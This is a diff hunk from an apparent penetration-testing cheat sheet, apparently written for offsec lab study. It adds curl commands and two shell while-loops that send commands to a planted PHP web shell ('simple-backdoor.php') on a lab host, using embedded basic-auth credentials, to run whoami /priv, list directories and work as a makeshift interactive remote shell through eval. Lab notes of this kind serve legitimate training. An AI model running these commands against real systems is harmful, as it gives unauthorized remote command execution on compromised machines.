@@ -1240,8 +1240,17 @@ rpcclient $>
 
 </aside>
 
-## Curl HTTP requests
+## Curl HTTP requests login with while command
+- I have a situation want login from curl with credentials
 
+```powershell
+http://offsec:elite@livda:242/simple-backdoor.php?cmd=whoami+/priv # Login with curl
+curl --data-urlencode "cmd=dir /a" http://offsec:elite@livda:242/simple-backdoor.php # Curl encode URL
+curl --data-urlencode "cmd=dir C:\\" http://offsec:elite@livda:242/simple-backdoor.php # Check in C drive
+# If ZSH is not working then Some time try with /bin/bash
+while true; do read  "? > " cmd; [ "$cmd" = "exit" ] && break; eval "curl --data-urlencode cmd=$cmd http://offsec:elite@192.168.104.46:242/simple-backdoor.php"; done;
+while true; do read  "? > " cmd; [ "$cmd" = "exit" ] && break; eval "curl --data-urlencode 'cmd=$cmd' http://offsec:elite@192.168.104.46:242/simple-backdoor.php"; done;
+```
 
 - Basic Request: You can use the command below to make a basic request to a website.
 
